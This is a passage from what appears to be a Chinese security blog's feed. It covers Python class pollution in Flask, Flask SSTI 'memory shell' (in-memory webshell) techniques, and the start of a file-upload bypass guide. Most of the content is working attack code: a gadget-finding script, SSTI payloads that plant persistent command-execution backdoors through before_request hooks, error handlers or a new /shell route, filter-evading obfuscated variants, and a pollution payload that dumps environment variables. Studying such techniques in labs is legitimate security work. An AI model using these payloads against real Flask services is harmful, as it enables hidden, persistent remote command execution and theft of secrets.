class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;app&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__dict__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;_static_folder&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;_static_url_path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/static&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="对于多重引入模块的污染"><a href="#对于多重引入模块的污染" class="headerlink" title="对于多重引入模块的污染"></a>对于多重引入模块的污染</h3><p>对于已经import sys的环境可以使用sys库来获取所有的已引入模块</p><p>具体payload大概这样：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;sys&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;modules&quot;</span> : &#123;</span><br><span class="line">                    <span class="string">&quot;test_1&quot;</span> : &#123;</span><br><span class="line">                        <span class="string">&quot;secret_var&quot;</span> : <span class="number">514</span>,</span><br><span class="line">                        <span class="string">&quot;target_class&quot;</span> : &#123;</span><br><span class="line">                            <span class="string">&quot;secret_class_var&quot;</span> : <span class="string">&quot;Poluuuuuuted ~&quot;</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么如果没有拿到的话就要通过内置Loader类进行获取</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(<span class="built_in">__import__</span>(<span class="string">&quot;importlib.__init__&quot;</span>)))</span><br><span class="line"><span class="comment">#True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(<span class="built_in">__import__</span>(<span class="string">&quot;importlib._bootstrap&quot;</span>)))</span><br><span class="line"><span class="comment">#True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(<span class="built_in">__import__</span>(<span class="string">&quot;importlib._bootstrap_external&quot;</span>)))</span><br><span class="line"><span class="comment">#True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(<span class="built_in">__import__</span>(<span class="string">&quot;importlib._common&quot;</span>)))</span><br><span class="line"><span class="comment">#True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(<span class="built_in">__import__</span>(<span class="string">&quot;importlib.abc&quot;</span>)))</span><br><span class="line"><span class="comment">#True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(<span class="built_in">__import__</span>(<span class="string">&quot;importlib.machinery&quot;</span>)))</span><br><span class="line"><span class="comment">#True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(<span class="built_in">__import__</span>(<span class="string">&quot;importlib.metadata&quot;</span>)))</span><br><span class="line"><span class="comment">#True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(<span class="built_in">__import__</span>(<span class="string">&quot;importlib.resources&quot;</span>)))</span><br><span class="line"><span class="comment">#True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> <span class="built_in">dir</span>(<span class="built_in">__import__</span>(<span class="string">&quot;importlib.util&quot;</span>)))</span><br><span class="line"><span class="comment">#True</span></span><br></pre></td></tr></table></figure><p>loader类通过一个模块的<code>__spec__.__loader__</code>属性获取即可</p><h3 id="实现RCE的污染"><a href="#实现RCE的污染" class="headerlink" title="实现RCE的污染"></a>实现RCE的污染</h3><h5 id="got-first-request"><a href="#got-first-request" class="headerlink" title="_got_first_request"></a>_got_first_request</h5><p>我们知道新版的flask中对内存马进行了限制，如果已经启动，收到第一个请求，那么就无法再直接执行添加路由之类的操作</p><p>但是对这个属性进行污染之后就不会触发检查了：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;app&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;_got_first_request&quot;</span><span class="punctuation">:</span>False</span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h5 id="对jinja表示符污染"><a href="#对jinja表示符污染" class="headerlink" title="对jinja表示符污染"></a>对jinja表示符污染</h5><p><a href="https://jinja.palletsprojects.com/en/stable/api/#jinja2.Environment">https://jinja.palletsprojects.com/en/stable/api/#jinja2.Environment</a></p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__init__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__globals__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;app&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;jinja_env&quot;</span> <span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;variable_start_string&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;[[&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;variable_end_string&quot;</span><span class="punctuation">:</span><span class="string">&quot;]]&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span>        </span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>如果使用<code>render_template()</code>函数渲染模版：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;__init__&quot;:&#123;</span><br><span class="line">&quot;__globals__&quot;:&#123;</span><br><span class="line">&quot;__loader__&quot;:&#123;</span><br><span class="line">&quot;__init__&quot;:&#123;</span><br><span class="line">&quot;__globals__&quot;:&#123;</span><br><span class="line">&quot;sys&quot;:&#123;</span><br><span class="line">&quot;modules&quot;:&#123;</span><br><span class="line">&quot;jinja2&quot;:&#123;</span><br><span class="line">&quot;runtime&quot;:&#123;</span><br><span class="line">&quot;exported&quot;:[</span><br><span class="line">&quot;*;__import__(&#x27;os&#x27;).popen(&#x27;env&#x27;).read();#&quot;</span><br><span class="line">]</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> nodejs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>flask_ssti内存马</title>
      <link href="/2025/07/16/flask-memory-shell/"/>
      <url>/2025/07/16/flask-memory-shell/</url>
      
        <content type="html"><![CDATA[<h1 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h1><p><a href="https://www.cnblogs.com/gxngxngxn/p/18181936">https://www.cnblogs.com/gxngxngxn/p/18181936</a><br>这里的内存不是二进制那些高深的概念<br>就是改变某些在请求过程中，<br>会起到作用的属性和方法，从而达到我们的目的<br>写内存马的前提不同于文件马<br>需要实现的是代码执行而不是文件读写</p><h3 id="利用脚本找出ssti中存在的eval"><a href="#利用脚本找出ssti中存在的eval" class="headerlink" title="利用脚本找出ssti中存在的eval"></a>利用脚本找出ssti中存在的eval</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:5000?name=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">400</span>):</span><br><span class="line">    payload=<span class="string">&quot;&#123;&#123;().__class__.__base__.__subclasses__()[&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;].__init__.__globals__.__builtins__.eval(&#x27;print(0)&#x27;)&#125;&#125;&quot;</span></span><br><span class="line">    response = requests.get(url=url+payload)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="built_in">print</span>(().__class__.__base__.__subclasses__()[i])</span><br></pre></td></tr></table></figure><p>那么我们就成功拿到了一个代码执行的payload</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[<span class="number">104</span>].__init__.__globals__.__builtins__.<span class="built_in">eval</span>(<span class="string">&#x27;print(0)&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="获取回显的方式"><a href="#获取回显的方式" class="headerlink" title="获取回显的方式"></a>获取回显的方式</h3><p><img src="/2025/07/16/flask-memory-shell/5.png" alt="alt text"></p><h3 id="示例：before-request"><a href="#示例：before-request" class="headerlink" title="示例：before_request"></a>示例：before_request</h3><p>靶场源码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;Guest&#x27;</span>)</span><br><span class="line">    template = <span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">    &lt;html&gt;</span></span><br><span class="line"><span class="string">    &lt;head&gt;</span></span><br><span class="line"><span class="string">        &lt;title&gt;SSTI示例&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;/head&gt;</span></span><br><span class="line"><span class="string">    &lt;body&gt;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;Hello <span class="subst">&#123;name&#125;</span>!&lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;/body&gt;</span></span><br><span class="line"><span class="string">    &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><h5 id="获取到app（Flask对象）"><a href="#获取到app（Flask对象）" class="headerlink" title="获取到app（Flask对象）"></a>获取到app（Flask对象）</h5><p>使用<code>Python</code>的内置核心模块<code>sys</code>来获取</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sys是Python 的一个内置核心模块，</span><br><span class="line">而sys.modules是一个记录了“当前Python程序加载了哪些模块”的“全局花名册”。</span><br><span class="line">通过这个花名册，我们能找到主程序，</span><br><span class="line">并拿到主程序里定义的全局变量，其中就包括 app。</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;sys&#x27;</span>).modules[<span class="string">&#x27;__main__&#x27;</span>].__dict__[<span class="string">&#x27;app&#x27;</span>]</span><br></pre></td></tr></table></figure><p>当然如果变量名不是约定俗成的app就要通过别的方法来获取</p><h5 id="flask"><a href="#flask" class="headerlink" title="flask&lt;2.1.3 || 3.0 &lt; flask"></a>flask&lt;2.1.3 || 3.0 &lt; flask</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]</span><br></pre></td></tr></table></figure><h5 id="2-3"><a href="#2-3" class="headerlink" title="2.3&lt;flask&lt;3.0"></a>2.3&lt;flask&lt;3.0</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">get_flashed_messages.__globals__[<span class="string">&#x27;current_app&#x27;</span>]</span><br></pre></td></tr></table></figure><h5 id="获取定制回显"><a href="#获取定制回显" class="headerlink" title="获取定制回显"></a>获取定制回显</h5><p>使用before_request钩子的场景<br><a href="https://geek-docs.com/flask/flask-questions/69_flask_python_flask_after_request_and_before_request_for_a_specific_set_of_request.html">https://geek-docs.com/flask/flask-questions/69_flask_python_flask_after_request_and_before_request_for_a_specific_set_of_request.html</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">before_request</span>():</span><br><span class="line">    <span class="comment"># 执行一些操作，例如进行身份验证</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> request.headers.get(<span class="string">&quot;Authorization&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Unauthorized&quot;</span>, <span class="number">401</span></span><br></pre></td></tr></table></figure><p>源码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@setupmethod</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">before_request</span>(<span class="params">self, f: T_before_request</span>) -&gt; T_before_request:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Register a function to run before each request.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    For example, this can be used to open a database connection, or</span></span><br><span class="line"><span class="string">    to load the logged in user from the session.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. code-block:: python</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @app.before_request</span></span><br><span class="line"><span class="string">        def load_user():</span></span><br><span class="line"><span class="string">            if &quot;user_id&quot; in session:</span></span><br><span class="line"><span class="string">                g.user = db.session.get(session[&quot;user_id&quot;])</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    The function will be called without any arguments. If it returns</span></span><br><span class="line"><span class="string">    a non-``None`` value, the value is handled as if it was the</span></span><br><span class="line"><span class="string">    return value from the view, and further request handling is</span></span><br><span class="line"><span class="string">    stopped.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    This is available on both app and blueprint objects. When used on an app, this</span></span><br><span class="line"><span class="string">    executes before every request. When used on a blueprint, this executes before</span></span><br><span class="line"><span class="string">    every request that the blueprint handles. To register with a blueprint and</span></span><br><span class="line"><span class="string">    execute before every request, use :meth:`.Blueprint.before_app_request`.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="variable language_">self</span>.before_request_funcs.setdefault(<span class="literal">None</span>, []).append(f)</span><br><span class="line">    <span class="keyword">return</span> f</span><br></pre></td></tr></table></figure><hr><h5 id="before-request-funcs数据类型"><a href="#before-request-funcs数据类型" class="headerlink" title="before_request_funcs数据类型"></a>before_request_funcs数据类型</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">self</span>.before_request_funcs: <span class="built_in">dict</span>[</span><br><span class="line">    ft.AppOrBlueprintKey, </span><br><span class="line">    <span class="built_in">list</span>[ft.BeforeRequestCallable]</span><br><span class="line">] = defaultdict(<span class="built_in">list</span>)</span><br></pre></td></tr></table></figure><p>print出来看一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">defaultdict(&lt;class &#x27;list&#x27;&gt;, &#123;None: [&lt;function a at 0x000001CF00494D60&gt;, &lt;function a at 0x000001CF00652160&gt;]&#125;)</span><br></pre></td></tr></table></figure><p>这里使用到的是<strong>defaultdict默认字典</strong></p><p>作用是访问不存在的键时自动创建一个默认值</p><p><strong><code>setdefault(key, default_value)</code> 的作用</strong>：</p><ol><li>它会先在字典中查找你提供的 <code>key</code>。</li><li><strong>如果 <code>key</code> 存在</strong>，它就直接返回这个 <code>key</code> 对应的 <code>value</code>。</li><li><strong>如果 <code>key</code> 不存在</strong>，它会先将 <code>default_value</code> 设置为这个新 <code>key</code> 的值，**然后再返回这个 <code>default_value</code>**。</li></ol><p>也就是说编写在用户自己的应用里的before_request函数，<br>会作为一个函数（f）添加进before_request_funcs里</p><p>这些函数会在请求进入真正的接口前执行</p><p>如果这些函数没有返回值（<code>None</code>）则成功进入接口<br>否则回显对应的返回值，那我们就可以使用<code>lambda</code>表达式定制自己的回显了<br>payload:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">app.before_request_funcs.setdefault(<span class="literal">None</span>, []).append(<span class="keyword">lambda</span> :xxx)</span><br></pre></td></tr></table></figure><h5 id="配合ssti写入内存马"><a href="#配合ssti写入内存马" class="headerlink" title="配合ssti写入内存马"></a>配合ssti写入内存马</h5><p>把上述的获取方式拼接一下得到内存马的payload：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None, []).append(lambda :__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;ivory&#x27;)).read())&quot;</span>)</span><br></pre></td></tr></table></figure><p>结合上面到<code>eval</code>的payload，拼起来就是：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">104</span>].__init__.__globals__.__builtins__.<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None, []).append(lambda :__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;ivory&#x27;)).read())&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p>但是利用这个payload会出现报错<br><img src="/2025/07/16/flask-memory-shell/6.png" alt="alt text"><br>因为外面的<code>flask</code>并不在<code> lambda</code>函数的执行环境中<br>所以接收命令的部分需要额外加一个<code>import</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;flask&#x27;</span>).request.args.get(<span class="string">&#x27;ivory&#x27;</span>)</span><br></pre></td></tr></table></figure><p>最终payload:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">104</span>].__init__.__globals__.__builtins__.<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None, []).append(lambda :__import__(&#x27;os&#x27;).popen(__import__(&#x27;flask&#x27;).request.args.get(&#x27;ivory&#x27;)).read())&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get_flashed_messages.__globals__[&#x27;current_app&#x27;]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[104].__init__.__globals__.__builtins__.eval(&quot;app.before_request_funcs.setdefault(None, []).append(lambda :__import__(&#x27;os&#x27;).popen(__import__(&#x27;flask&#x27;).request.args.get(&#x27;ivory&#x27;)).read())&quot;,&#123;&#x27;app&#x27;:get_flashed_messages.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="Errorhandle"><a href="#Errorhandle" class="headerlink" title="Errorhandle"></a>Errorhandle</h3><p>在pickle反序列化中直接exec的方法：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;gxngxngxn&#x27;)).read()&quot;</span>)</span><br></pre></td></tr></table></figure><p>重复上述的过程构造ssti</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:8080?name=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">400</span>):</span><br><span class="line">    payload=<span class="string">&quot;&#123;&#123;().__class__.__base__.__subclasses__()[&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;].__init__.__globals__.__builtins__.exec(&#x27;print(0)&#x27;)&#125;&#125;&quot;</span></span><br><span class="line">    response = requests.get(url=url+payload)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="built_in">print</span>(().__class__.__base__.__subclasses__()[i])</span><br></pre></td></tr></table></figure><p>104依旧可以使用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[104].__init__.__globals__.__builtins__.exec(&#x27;print(0)&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>填入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[104].__init__.__globals__.__builtins__.exec(&quot;app=__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;];exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(__import__(&#x27;flask&#x27;).request.args.get(&#x27;ivory&#x27;)).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>需要注意的是这里需要去掉两个global声明<br>因为pickle.loads()在主环境中执行，而ssti则是一个临时的环境</p><h3 id="更进一步"><a href="#更进一步" class="headerlink" title="更进一步"></a>更进一步</h3><p>经过对上面这两个钩子函数利用的学习</p><p>我发现新版内存马的底层逻辑就是复现钩子函数的底层逻辑<br>这样就可以绕过装饰器setupmethod</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="variable language_">self</span>.__init__.__globals__.__builtins__.<span class="built_in">exec</span>(<span class="string">&quot;app = __import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;]; rule = app.url_rule_class(&#x27;/shell&#x27;, endpoint=&#x27;shell&#x27;, methods=&#123;&#x27;GET&#x27;&#125;); app.url_map.add(rule); app.view_functions[&#x27;shell&#x27;] = lambda: __import__(&#x27;os&#x27;).popen(__import__(&#x27;flask&#x27;).request.args.get(&#x27;ivory&#x27;)).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p>后来找找已经有人发过了</p><p><a href="https://www.caterpie771.cn/archives/308?utm_source=chatgpt.com#flask%3E213">https://www.caterpie771.cn/archives/308?utm_source=chatgpt.com#flask%3E213</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">104</span>].__init__.__globals__.__builtins__.<span class="built_in">exec</span>(<span class="string">&quot;app = __import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;]; rule = app.url_rule_class(&#x27;/shell&#x27;, endpoint=&#x27;shell&#x27;, methods=&#123;&#x27;GET&#x27;&#125;); app.url_map.add(rule); app.view_functions[&#x27;shell&#x27;] = lambda: __import__(&#x27;os&#x27;).popen(__import__(&#x27;flask&#x27;).request.args.get(&#x27;ivory&#x27;)).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;(()[<span class="string">&quot;__cl&quot;</span>+<span class="string">&quot;ass__&quot;</span>][<span class="string">&quot;__b&quot;</span>+<span class="string">&quot;ase__&quot;</span>][<span class="string">&quot;__subcl&quot;</span>+<span class="string">&quot;asses__&quot;</span>]()[<span class="number">104</span>].__init__ | attr(<span class="string">&#x27;__glo&#x27;</span>+<span class="string">&#x27;bals__&#x27;</span>)).__builtins__.<span class="built_in">exec</span>(<span class="string">&quot;app = __impo&quot;</span>+<span class="string">&quot;rt__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;]; rule = app.url_rule_class(&#x27;/shell&#x27;, endpoint=&#x27;shell&#x27;, methods=&#123;&#x27;GET&#x27;&#125;); app.url_map.add(rule); app.view_functions[&#x27;shell&#x27;] = lambda: __imp&quot;</span>+<span class="string">&quot;ort__(&#x27;os&#x27;).popen(__imp&quot;</span>+<span class="string">&quot;ort__(&#x27;flask&#x27;).request.args.get(&#x27;ivory&#x27;)).read();&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;;&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&quot;__cl&quot;</span>+<span class="string">&quot;ass__&quot;</span>][<span class="string">&quot;__b&quot;</span>+<span class="string">&quot;ase__&quot;</span>][<span class="string">&quot;__subcl&quot;</span>+<span class="string">&quot;asses__&quot;</span>]()[<span class="number">104</span>].__init__ | attr(<span class="string">&#x27;__glo&#x27;</span>+<span class="string">&#x27;bals__&#x27;</span>)).__builtins__.<span class="built_in">exec</span>(<span class="string">&quot;__imp&quot;</span>+<span class="string">&quot;ort__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None, []).append(lambda :__imp&quot;</span>+<span class="string">&quot;ort__(&#x27;os&#x27;).popen(__imp&quot;</span>+<span class="string">&quot;ort__(&#x27;flask&#x27;).request.args.get(&#x27;ivory&#x27;)).read())&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;aaa.__init__.__globals__.__builtins__.exec(&quot;__import__(&#x27;os&#x27;).popen(__import__(&#x27;flask&#x27;).request.args.get(&#x27;ivory&#x27;)).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Upload_LFI补课</title>
      <link href="/2025/06/10/Upload-LFI-plus/"/>
      <url>/2025/06/10/Upload-LFI-plus/</url>
      
        <content type="html"><![CDATA[<h1 id="upload-lab补测"><a href="#upload-lab补测" class="headerlink" title="upload_lab补测"></a>upload_lab补测</h1><h1 id="常见绕过"><a href="#常见绕过" class="headerlink" title="常见绕过"></a>常见绕过</h1><ul><li><h3 id="前端拦截"><a href="#前端拦截" class="headerlink" title="前端拦截"></a>前端拦截</h3></li></ul><p>前端都是纸老虎<br>简单的话就使用console修改前端js实现<br>复杂的话就上传一个正常文件，然后修改流量包</p><ul><li><h3 id="MIME类型判断"><a href="#MIME类型判断" class="headerlink" title="MIME类型判断"></a>MIME类型判断</h3></li></ul><p>例如限制了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Type: image/png</span><br></pre></td></tr></table></figure><p>那么直接在上传木马时修改成对应的即可<br>不会影响文件的使用</p><ul><li><h3 id="黑名单（过滤不全）"><a href="#黑名单（过滤不全）" class="headerlink" title="黑名单（过滤不全）"></a>黑名单（过滤不全）</h3></li></ul><p>那么可以解析为php的文件后缀有很多<br>常见的：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php,php3,php4,php5,phtml</span><br></pre></td></tr></table></figure><ul><li><h3 id="黑名单（过滤全木马）"><a href="#黑名单（过滤全木马）" class="headerlink" 